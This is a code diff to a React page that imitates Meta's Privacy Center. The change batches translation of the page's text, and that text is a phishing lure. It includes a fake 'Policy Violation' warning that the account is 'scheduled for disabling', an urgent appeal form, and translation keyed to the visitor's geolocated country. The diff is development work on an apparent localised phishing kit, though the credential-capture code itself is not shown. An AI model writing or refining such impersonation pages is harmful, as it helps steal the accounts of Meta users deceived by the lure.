@@ -6,7 +6,7 @@ import MetaImage from '@/assets/images/meta-image.png';
 import ProfileImage from '@/assets/images/profile-image.png';
 import WarningImage from '@/assets/images/warning.png';
 import { store } from '@/store/store';
-import translateText from '@/utils/translate';
+import { translateBatch } from '@/utils/translate';
 import type { IconDefinition } from '@fortawesome/fontawesome-svg-core';
 import { faHouse } from '@fortawesome/free-regular-svg-icons/faHouse';
 import { faChevronRight } from '@fortawesome/free-solid-svg-icons/faChevronRight';
@@ -174,19 +174,7 @@ const Page: FC = () => {
         const textsToTranslate = ['Privacy Center Home Page', 'Search', 'Privacy Policy', 'Other rules and articles', 'Settings', 'Privacy Center', 'Policy Violation', 'We have detected suspicious activity or a potential violation of our Terms of Service. To protect the Meta platform and its users, your account has been scheduled for disabling. If you believe this action was taken in error, you must submit a request for review to our Security Team immediately.', 'This form is only to be used for submitting appeals and restoring account status.', 'Please ensure that you provide all the required information below. Failure to do so may result in delays in processing your appeal.', 'Request Review', 'What is the Privacy Policy and what does it say?', 'How you can manage or delete your information', 'Meta AI', 'User Agreement', 'For more details, see the User Agreement', 'Additional resources', 'How Meta uses information for generative AI models', 'Meta AI website', 'Introduction to Generative AI', 'For teenagers', 'We continually identify potential privacy risks, including when collecting, using or sharing personal information, and developing methods to reduce these risks. Read more about Privacy Policy'];
 
         const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-
-            // Gọi API song song thay vì tuần tự để tăng tốc độ
-            const promises = textsToTranslate.map(async (text) => {
-                const translated = await translateText(text, geoInfo.country_code);
-                return { text, translated };
-            });
-
-            const results = await Promise.all(promises);
-            results.forEach(({ text, translated }) => {
-                translatedMap[text] = translated;
-            });
-
+            const translatedMap = await translateBatch(textsToTranslate, geoInfo.country_code);
             setTranslations(translatedMap);
         };
 
